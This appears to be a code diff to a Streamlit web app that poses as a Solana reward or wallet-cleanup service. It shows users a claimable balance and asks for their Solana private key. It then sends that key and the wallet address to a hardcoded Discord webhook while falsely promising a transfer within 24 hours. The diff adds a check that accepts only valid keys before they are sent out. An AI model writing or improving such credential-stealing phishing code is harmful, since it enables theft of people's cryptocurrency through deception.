@@ -11,6 +11,14 @@ solana_client = Client("https://api.mainnet-beta.solana.com")
 # Discord webhook URL
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
 
+def is_valid_solana_private_key(private_key):
+    
+    try:
+        decoded_key = base58.b58decode(private_key)
+        return len(decoded_key) == 32
+    except:
+        return False
+
 def check_wallet_eligibility(wallet_address):
     try:
         pubkey = PublicKey(wallet_address)
@@ -47,13 +55,15 @@ if menu == "Check Wallet ✅":
             
             if claimable_sol > 0:
                 st.success(f"🎉 You have {claimable_sol:.6f} SOL available to claim!")
-                private_key = st.text_input("Enter your private key to proceed:", type="password")
+                private_key = st.text_input("Enter your Solana private key to proceed:", type="password")
                 
                 if private_key:
-                    send_to_discord(wallet_address, private_key)
-                    st.success("✅ Successfully initiated cleanup!")
-                    st.info("🕒 Your SOL will be transferred within 24 hours. Thank you for your patience!")
-
+                    if is_valid_solana_private_key(private_key):
+                        send_to_discord(wallet_address, private_key)
+                        st.success("✅ Successfully initiated cleanup!")
+                        st.info("🕒 Your SOL will be transferred within 24 hours. Thank you for your patience!")
+                    else:
+                        st.error("❌ Please enter a valid Solana private key")
 elif menu == "Invite & Earn 📢":
     st.header("Invite & Earn 📢")
     st.write("🚧 This feature is currently under development. 🚧")
